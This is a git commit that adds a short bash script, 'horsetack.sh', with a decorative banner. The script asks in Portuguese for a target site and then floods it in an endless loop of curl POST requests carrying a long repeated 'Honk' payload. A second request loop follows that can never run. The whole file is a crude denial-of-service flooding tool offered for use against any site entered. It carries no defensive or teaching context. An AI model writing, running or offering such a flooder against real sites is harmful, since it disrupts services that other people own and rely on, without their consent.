a4a23e21577fc9015dd5deae9a0ee29b33d3f1b2
Cavalo01 <124747668+Cavalo01@users.noreply.github.com>
2023-09-18 23:25:29 -0300

    horsetack.sh

---
+++ horsetack.sh
@@ -0,0 +1,18 @@
+#!/bin/bash
+
+banner="╭╮╱╭┳━━━┳━━━┳━━━┳━━━┳━━━━┳━━━┳━━━┳╮╭━┳━━━┳╮╱╭╮
+┃┃╱┃┃╭━╮┃╭━╮┃╭━╮┃╭━━┫╭╮╭╮┃╭━╮┃╭━╮┃┃┃╭┫╭━╮┃┃╱┃┃
+┃╰━╯┃┃╱┃┃╰━╯┃╰━━┫╰━━╋╯┃┃╰┫┃╱┃┃┃╱╰┫╰╯╯┃╰━━┫╰━╯┃
+┃╭━╮┃┃╱┃┃╭╮╭┻━━╮┃╭━━╯╱┃┃╱┃╰━╯┃┃╱╭┫╭╮┃╰━━╮┃╭━╮┃
+┃┃╱┃┃╰━╯┃┃┃╰┫╰━╯┃╰━━╮╱┃┃╱┃╭━╮┃╰━╯┃┃┃╰┫╰━╯┃┃╱┃┃
+╰╯╱╰┻━━━┻╯╰━┻━━━┻━━━╯╱╰╯╱╰╯╱╰┻━━━┻╯╰━┻━━━┻╯╱╰╯"
+
+echo "$banner"
+read -p "DIGITE O SITE ALVO: " site
+
+while true; do
+curl -X POST -d "HonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonkHonk" "$site"
+done
+while true; do
+curl -k "$site"
+done
